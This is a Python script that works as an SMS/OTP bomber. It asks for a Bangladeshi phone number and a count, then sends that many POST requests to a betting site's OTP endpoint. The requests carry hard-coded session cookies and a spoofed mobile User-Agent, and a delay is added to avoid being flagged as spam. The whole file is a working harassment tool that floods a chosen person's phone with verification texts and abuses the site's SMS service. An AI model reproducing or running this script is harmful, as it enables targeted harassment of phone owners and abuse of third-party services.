import requests
import time

# Replace with the actual mobile number
phone = input('Enter Number: ')
phone = phone.lstrip('0')

# Set the URL
url = 'https://royalbg88.vip/otp-request'

# Set headers
headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 12; Mi 10 Pro Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.99 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://royalbg88.vip',
    'Referer': 'https://royalbg88.vip/',
    'Cookie': 'ci_session=br5cs5ve036lks7t1q9rllas2sot6ov0; csrf_cookie_name=7b6dd099c8ecb4a18776b0d6fec121df'
}

# Get the custom limit from the user
while True:
    try:
        limit = int(input('Enter Amount: '))
        if limit > 0:
            break
        else:
            print("Please enter a positive integer.")
    except ValueError:
        print("Invalid input. Please enter a valid number.")

for i in range(limit):
    # Set the POST data
    post_data = {
        'params[regionCode]': '+880',
        'params[mobileNo]': phone
    }

    # Make the POST request
    response = requests.post(url, data=post_data, headers=headers)

    # Check for errors and print the response
    if response.status_code == 200:
        print(f"Attempt {i+1}/{limit}: {response.text}")
    else:
        print(f"Attempt {i+1}/{limit}: Error {response.status_code} - {response.reason}")

    # Optional: Add a delay between requests to avoid being flagged as spam
    time.sleep(1)  # Sleep for 1 second between requests